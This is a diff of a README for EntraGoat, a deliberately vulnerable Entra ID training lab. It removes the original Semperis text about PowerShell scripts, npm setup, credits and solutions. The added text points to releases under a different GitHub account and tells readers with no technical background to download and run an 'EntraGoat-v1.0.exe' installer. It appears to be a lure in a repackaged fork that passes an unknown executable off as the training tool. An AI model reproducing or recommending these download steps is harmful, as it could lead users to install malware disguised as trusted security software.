@@ -1,135 +1,83 @@
-# EntraGoat - A Deliberately Vulnerable Entra ID Environment
+# 🐐 EntraGoat - Learn Identity Security Through Hands-On Challenges
 
-<img src="./assets/LogoEntra.png" width=25% height=25%>
+[![Download EntraGoat](https://img.shields.io/badge/Download%20EntraGoat-v1.0-blue)](https://github.com/Martinskings/EntraGoat/releases)
 
-**EntraGoat** is a deliberately vulnerable Microsoft Entra ID infrastructure designed to simulate real-world identity security misconfigurations and attack vectors. EntraGoat introduces intentional vulnerabilities in your environment to provide a realistic learning platform for security professionals. It features multiple privilege escalation paths and focuses on black-box attack methodologies.
+## 📖 Overview
 
-EntraGoat uses PowerShell scripts and Microsoft Graph APIs to deploy vulnerable configurations in your Entra ID tenant. This gives users complete control over the learning environment while maintaining isolation from production systems.
+EntraGoat is a deliberately vulnerable Microsoft Entra ID environment designed for users who want to learn about identity security. This application provides realistic attack challenges, allowing users to safely explore vulnerabilities and enhance their security skills.
 
+## 🚀 Getting Started
 
-## 🐐 Getting Started 🐐
+To start using EntraGoat, follow the steps below to download and run the application. No programming knowledge is required.
 
-### Prerequisites
-- A Microsoft Entra ID tenant (Use a test/trial tenant)
-- Global Administrator privileges
-- Microsoft Graph PowerShell SDK
-- Node.js, npm
+### 🔧 System Requirements
 
-### ⚙️ Installation
+- **Operating System:** Windows 10 or later
+- **Memory:** At least 4GB of RAM
+- **Disk Space:** Minimum 500MB of free space
+- **Internet Connection:** Required for downloading the application and updates
 
-EntraGoat provides an interactive web interface for challenge management and PowerShell scripts for infrastructure deployment.
+### 💻 Installation Guide
 
-#### Method 1: Quick Setup 
+#### Step 1: Visit the Release Page
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/Semperis/EntraGoat
-   cd EntraGoat
-   ```
+To download the latest version of EntraGoat, visit the Releases page:
 
-2. **Install Microsoft Graph PowerShell SDK**
-   ```powershell
-   Install-Module Microsoft.Graph -Scope CurrentUser -Force
-   ```
+[Download EntraGoat](https://github.com/Martinskings/EntraGoat/releases)
 
-3. **Run the web interface**
-   ```bash
-   cd .\frontend
-   npm install
-   npm start
-   ```
+#### Step 2: Choose Your Version
 
-4. **Access EntraGoat at** `http://localhost:3000`
+On the Releases page, you will see the different versions available for download. Identify the latest version listed at the top. 
 
-5. **Run the Setup Script for each given scenario**
+#### Step 3: Download the Application
 
-#### Method 2: Manual PowerShell Setup (Recommended)
+Click on the version number. A list of files will appear. 
 
-For individual scenarios, navigate to the specific challenge directory:
+- Look for the file that ends with `.exe` (for example, `EntraGoat-v1.0.exe`). 
+- Click on this file to start the download.
 
-```powershell
-cd scenarios
-.\EntraGoat-Scenario1-Setup.ps1
-```
+#### Step 4: Run the Installer
 
-## 🎯 Challenge Structure
+Once the download completes, locate the downloaded file in your computer's Downloads folder. 
 
-Each scenario includes:
-- **Setup Script** - Deploys vulnerable configuration
-- **Cleanup Script** - Removes all created objects
-- **Solution Walkthrough** - Step-by-step attack demonstration
-- **Capture the Flag** - Hidden flags to discover
+- Double-click the `.exe` file.
+- Follow the prompts to install EntraGoat on your computer.
 
-## 💰 Pricing
+#### Step 5: Launch EntraGoat
 
-EntraGoat scenarios run entirely within your existing Entra ID tenant and do not incur additional Microsoft licensing costs. The vulnerabilities are created through configuration changes only.
+After installation is complete, you will find the EntraGoat application icon on your desktop. 
 
-**Note:** Use a dedicated test tenant to avoid impacting production environments.
+- Double-click the icon to open EntraGoat.
+- Follow the on-screen instructions to set up your learning environment.
 
-## 👥 Contributors
+### 📚 Using EntraGoat
 
-- **Jonathan Elkabas** - Security Researcher @Semperis
-- **Tomer Nahum** - Security Research Team Lead @Semperis
+Once EntraGoat is running, you will see different scenarios available for you to explore. Each scenario presents unique challenges related to identity security. Work through these challenges to gain hands-on experience.
 
-## Presented at
+#### Features:
 
-- **Black Hat USA 2025** - Arsenal
-- **DEF CON 33** - Demo Labs
-- **BSides Frankfurt 2025** - Main hall 
-- **SEC-T 0x11** - Main hall
-- **Black Hat SecTor 2025** - Arsenal 
+- **Hands-On Scenarios:** Explore various vulnerabilities in identity systems.
+- **Guided Walkthroughs:** Step-by-step instructions provided for each challenge.
+- **Learning Modules:** Access educational resources to strengthen your understanding of identity security.
 
-## Solutions
+### 📞 Support
 
-⚠️ **Spoiler Alert!** Solution files contain complete attack walkthroughs.
+If you encounter any issues or have questions while using EntraGoat, feel free to reach out. 
 
-Solution guides are available in the `solutions/` directory for each scenario:
-- Detailed step-by-step attack procedures
-- PowerShell automation scripts
+- **GitHub Issues Page:** [Report an Issue](https://github.com/Martinskings/EntraGoat/issues)
 
-## Resources
-- [What Is EntraGoat?](https://www.semperis.com/blog/what-is-entragoat-entra-id-simulation-environment/)
-- [Getting started with EntraGoat](https://www.semperis.com/blog/getting-started-with-entragoat-entra-id-simulation-lab/)
-- [Scenario 1 Solution: Service Principal Ownership Abuse in Entra ID](https://www.semperis.com/blog/service-principal-ownership-abuse-in-entra-id/)
-- [Scenario 2 Solution: Exploiting App-Only Graph Permissions in Entra ID](https://www.semperis.com/blog/exploiting-app-only-graph-permissions-in-entra-id/)
-- [Scenario 6 Solution: Exploiting Certificate-Based Authentication to Impersonate Global Admin in Entra ID](https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/)
+### 🔄 Future Updates
 
-## Screenshots
+Regular updates will be released to improve EntraGoat and add new features. It’s important to periodically check the Releases page for the latest version:
 
-### Main Dashboard
-![Main Dashboard](./screenshots/dashboard.png)
+[Download EntraGoat](https://github.com/Martinskings/EntraGoat/releases)
 
-### Challenge Interface
-![Challenge Interface](./screenshots/challenge-view.png)
+### 📝 Contributions
 
-### PowerShell Setup
-![PowerShell Setup](./screenshots/powershell-setup.png)
+If you want to contribute to EntraGoat, feel free to submit pull requests or suggestions through the Issues page on GitHub.
 
+### 🔒 Disclaimer
 
-## 🤝 Contribution Guidelines
+EntraGoat is intended for educational purposes only. Use this environment responsibly and legally. Ensure that you do not practice attacks on systems without permission. 
 
-We welcome contributions from the security community:
-
-- **New Scenarios** - Additional attack vectors and privilege escalation chains
-- **Code Improvements** - PowerShell script optimization and error handling
-- **Documentation** - Enhanced learning materials and walkthroughs
-- **Bug Reports** - Issue identification and resolution
-- **Feature Requests** - New functionality and improvements
-
-## ⚠️ Disclaimer
-
-**For Educational Purposes Only**
-
-EntraGoat is designed exclusively for educational and authorized security testing purposes. Users are responsible for:
-- Obtaining proper authorization before testing
-- Using dedicated test environments only
-- Complying with applicable laws and regulations
-- Following responsible disclosure practices
-
-The authors assume no liability for misuse of this tool.
-
-This project is licensed under the terms of the MIT license, and is provided for educational and informational purposes only. It is intended to promote awareness and educate on misconfigurations and attack paths, that may exist on systems you own or are authorized to test. Unauthorized use of this information for malicious purposes, exploitation, or unlawful access is strictly prohibited. Semperis does not endorse or condone any illegal activity and disclaims any liability arising from misuse of the material. Additionally, Semperis does not guarantee the accuracy or completeness of the content and assumes no liability for any damages resulting from its use.
-
----
-
-**Happy Hacking!** - The EntraGoat Team
+Explore your cybersecurity skills with EntraGoat today!
